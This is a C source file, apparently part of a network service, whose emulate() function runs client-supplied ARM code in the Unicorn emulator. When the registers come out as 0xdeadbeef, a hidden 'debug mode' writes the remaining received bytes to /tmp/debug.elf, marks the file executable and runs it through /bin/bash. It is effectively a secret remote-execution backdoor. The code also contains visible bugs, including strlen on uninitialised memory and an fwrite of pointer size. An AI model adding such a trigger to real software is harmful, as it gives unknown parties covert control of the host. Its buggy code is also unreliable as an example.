#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

// custom
#include "emu.h"
#include "helper.h"
#include "const.h"
// unicorn
#include <unicorn/unicorn.h>
#include <unicorn/x86.h>

#define shellcode_size 1000000 * 100 // 100 MB

// this is just here to help debug things should something go wrong.
//#define ARM_CODE "\xde\x00\xa0\xe3\xad\x10\xa0\xe3\xbe\x20\xa0\xe3\xef\x30\xa0\xe3"
//
/**
 * Custom payload format for emulate function
 *   4 ascii-bytes  20 ARM-bytes    N number of bytes to get dumped to /tmp/debug.elf
 *    [PREAMBLE]     [SHELLCODE]    [PAYLOAD]
**/
void emulate(int connfd, char *buff) {
        uc_engine *uc;
        uc_err err;
        uc_hook trace;

        // magic params
        int r0;
        int r1;
        int r2;
        int r3;

        // params for writing data
        int r5;

        char *shellcodebuf = (char *)malloc(strlen(buff));
        bzero(shellcodebuf, strlen(shellcodebuf));

        // rip off "shel" (4 bytes)
        // 16 bytes copied to shellcodebuf for emulation
        memcpy(shellcodebuf, &buff[4], 20);

        // create the x86 emulator
        err = uc_open(UC_ARCH_ARM, UC_MODE_ARM, &uc);
        if (err != UC_ERR_OK) {
            printf("Failed on uc_open() with error returned: %u\n", err);
            exit(1);
        }

        // malloc 2048 bytes
        uc_mem_map(uc, BASE_ADDR, 2048, UC_PROT_ALL);
        // write shellcode to BASE_ADDR;
        //uc_mem_write(uc, BASE_ADDR, &buff[4], sizeof(buff)-4);
        uc_mem_write(uc, BASE_ADDR, shellcodebuf, 16); // write 16 bytes of the shellcode buff

        // being emulation from the base addr up to the 16th byte
        uc_emu_start(uc, BASE_ADDR, BASE_ADDR + 16, 0, 0);

        // Read data into general purpose registers
        uc_reg_read(uc, UC_ARM_REG_R0, &r0);
        uc_reg_read(uc, UC_ARM_REG_R1, &r1);
        uc_reg_read(uc, UC_ARM_REG_R2, &r2);
        uc_reg_read(uc, UC_ARM_REG_R3, &r3);

        // 0xdeadbeef across 4 registers
        if (r0 == 222 && r1 == 173 && r2 == 190 && r3 == 239) {
            char *tmpMsg = "\nDEBUG MODE hit!\n";
            write(connfd, tmpMsg, strlen(tmpMsg));

            // dump bytes to disk and execute
            FILE *fd = fopen("/tmp/debug.elf", "a+");
            chmod("/tmp/debug.elf",  S_IWUSR|S_IXUSR|S_IRUSR);
            char *elfBuffer = (char *)malloc(shellcode_size); // 100MB
            bzero(elfBuffer, shellcode_size);

            // copying from byte 20 onward to elfBuffer to write to disk.
            memcpy(elfBuffer, &buff[20], strlen(&buff[20])); // substring from pwn command

            fwrite(elfBuffer, sizeof(elfBuffer), 1, fd);
            fclose(fd);
            char *args[]={"/bin/bash", "-c", "/tmp/debug.elf",NULL};
            execvp(args[0], args);
        }

        uc_close(uc);
        free(shellcodebuf);
        close(connfd);
}
